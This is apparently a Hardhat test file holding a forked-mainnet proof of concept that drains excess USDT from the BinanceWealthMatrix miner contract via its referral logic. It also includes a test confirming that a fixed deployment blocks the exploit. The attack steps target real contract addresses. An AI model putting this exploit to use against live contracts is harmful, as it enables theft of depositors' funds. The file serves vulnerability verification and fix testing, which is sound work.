import { expect } from "chai";
import  hre, { ethers } from 'hardhat';
import { loadFixture, time } from "@nomicfoundation/hardhat-network-helpers";
import { parseUnits,formatEther, parseEther } from "ethers/lib/utils";

describe("Miner Exploit", ()=>{

  const setup = async () => {
    const [ hacker1, hacker2, user1, user2 ] = await ethers.getSigners()
    const usdtHotWallet = await ethers.getImpersonatedSigner("0xf977814e90da44bfa03b6295a0616a897441acec")

    const USDT = await ethers.getContractAt(
      "@openzeppelin/contracts/token/ERC20/IERC20.sol:IERC20",
      "0x55d398326f99059fF775485246999027B3197955"
    );

    const miner = await ethers.getContractAt("BinanceWealthMatrix", "0x78ac2966d74452e408a2e0e0e41810c8155dcc50")
    const climb = await ethers.getContractAt("ClimbToken", "0x3260Ebd17d9038d2C2a3b24FFe5c8f1eA10603df")

    return{ hacker1, hacker2, usdtHotWallet, USDT, miner, climb,user1, user2 }
  }

  describe("Complete exploit", () => {
    it("Should exploit the damn thing", async () => {
      const { hacker1, hacker2, usdtHotWallet, USDT, miner, climb } = await loadFixture(setup)

      // Send USDT to first hacker
      const usdtAmount = parseEther("100")
      await USDT.connect(usdtHotWallet).transfer(hacker1.address, usdtAmount)
      await USDT.connect(hacker1).approve(miner.address, usdtAmount)

      const initClimb = await climb.balanceOf(miner.address)
      // Send initial amount to miner
      await miner.connect(hacker1)["investInMatrix(address,uint256)"](hacker1.address, usdtAmount)
      expect(await miner.connect(hacker1).getMyEggs()).to.be.equal(0)
      
      const bnbAmount = parseEther("0.01")
      // Second Hacker then invests a "small" BNB amount
      const tx = await miner.connect(hacker2)["investInMatrix(address)"](hacker1.address, { value: bnbAmount })
      const rc = await tx.wait();
      expect(await miner.referrals(hacker2.address)).to.equal(hacker1.address)
      
      expect(await miner.connect(hacker1).getMyEggs()).to.be.gt(0)
      // console.log({
      //   h1_eggs: await miner.connect(hacker1).getMyEggs(),
      //   h1_eggs_since_hatch: await miner.connect(hacker1).getEggsSinceLastHatch(hacker1.address),
      //   marketEggs: await miner.marketEggs(),
      //   sellPrice: await miner.calculateEggSell((await miner.connect(hacker1).getMyEggs()).add(await miner.connect(hacker1).getEggsSinceLastHatch(hacker1.address))),
      //   climbInContract: await climb.balanceOf(miner.address),
      //   logs: rc.events
      // })

      const h1USDT = await USDT.balanceOf(hacker1.address)
      await miner.connect(hacker1).matrixRedeem()
      expect(await USDT.balanceOf(hacker1.address)).to.be.greaterThan(h1USDT.add(parseEther("300")))
    })
    it("Does the exploit work with usdt as well? NO", async () => {
      
      const { hacker1, hacker2, usdtHotWallet, USDT, miner, climb } = await loadFixture(setup)

      // Send USDT to first hacker
      const usdtAmount = parseEther("100")
      await USDT.connect(usdtHotWallet).transfer(hacker1.address, usdtAmount)
      await USDT.connect(usdtHotWallet).transfer(hacker2.address, usdtAmount)
      await USDT.connect(hacker1).approve(miner.address, usdtAmount)
      await USDT.connect(hacker2).approve(miner.address, usdtAmount)

      const initClimb = await climb.balanceOf(miner.address)
      // Send initial amount to miner
      await miner.connect(hacker1)["investInMatrix(address,uint256)"](hacker1.address, usdtAmount)
      expect(await miner.connect(hacker1).getMyEggs()).to.be.equal(0)
      
      // Second Hacker then invests a "small" BNB amount
      const tx = await miner.connect(hacker2)["investInMatrix(address,uint256)"](hacker1.address, usdtAmount.div(3))
      const rc = await tx.wait()
      expect(await miner.referrals(hacker2.address)).to.equal(hacker1.address)

      expect(await miner.connect(hacker1).getMyEggs()).to.be.gt(0)
      console.log({
        h1_eggs: await miner.connect(hacker1).getMyEggs(),
        h1_eggs_since_hatch: await miner.connect(hacker1).getEggsSinceLastHatch(hacker1.address),
        marketEggs: await miner.marketEggs(),
        sellPrice: await miner.calculateEggSell((await miner.connect(hacker1).getMyEggs()).add(await miner.connect(hacker1).getEggsSinceLastHatch(hacker1.address))),
        climbInContract: await climb.balanceOf(miner.address),
      })

      const h1USDT = await USDT.balanceOf(hacker1.address)
      await miner.connect(hacker1).matrixRedeem()
      expect(await USDT.balanceOf(hacker1.address)).to.be.lessThan(h1USDT.add(parseEther("5")))
    })
  })

  const newSetup = async () => {
    const {user1, user2} = await setup()
    const usdtHotWallet = await ethers.getImpersonatedSigner("0xf977814e90da44bfa03b6295a0616a897441acec")
    const USDT = await ethers.getContractAt(
      "@openzeppelin/contracts/token/ERC20/IERC20.sol:IERC20",
      "0x55d398326f99059fF775485246999027B3197955"
    );
    // Get current climb owner
    const owner = await ethers.getImpersonatedSigner("0x3bfb99f6ed9dae9d09b65ef0bb0fff4473ea653b")
    // Get factories and current CLIMB contract
    const minerFactory = await ethers.getContractFactory("BinanceWealthMatrix", owner);
    const climb = await ethers.getContractAt("ClimbToken", "0x3260Ebd17d9038d2C2a3b24FFe5c8f1eA10603df")
    // send eth to owner
    await user1.sendTransaction({to: owner.address, value: parseEther("1")})
    // Deploy miner
    const miner = await minerFactory.deploy(climb.address)
    // Set matrix in CLIMB
    await climb.connect(owner).setMatrixContract(miner.address, true)
    // send USDT to user wallets
    await USDT.connect(usdtHotWallet).transfer(user1.address, parseEther("10000"))
    await USDT.connect(usdtHotWallet).transfer(user2.address, parseEther("10000"))
    // Approve USDT for miner
    await USDT.connect(user1).approve(miner.address, parseEther("10000"))
    await USDT.connect(user2).approve(miner.address, parseEther("10000"))

    // Initialize miner
    await miner.connect(owner).initializeMatrix()

    return { owner, climb, miner, usdtHotWallet, USDT, user1, user2 }
  }

  describe("Fixed Contract", () => {
    it("Should not have the exploit", async () => {
      const { user1, user2, USDT, miner, climb} = await loadFixture(newSetup)
      const usdtAmount = parseEther("100")
      const ethAmount = parseEther("0.01")
      // Send initial amount to miner
      await miner.connect(user1)["investInMatrix(address,uint256)"](user1.address, usdtAmount)
      expect(await miner.connect(user1).getMyEggs()).to.be.equal(0)
      // invest ETH in miner
      await miner.connect(user2)["investInMatrix(address)"](user1.address, { value: ethAmount })
      expect(await miner.connect(user2).getMyEggs()).to.be.equal(0)
      expect(await miner.connect(user1).getMyEggs()).to.be.gt(0)

      const h1USDT = await USDT.balanceOf(user1.address)
      await miner.connect(user1).matrixRedeem()
      expect(await USDT.balanceOf(user1.address)).to.be.lessThan(h1USDT.add(parseEther("10")))

    })
  })

})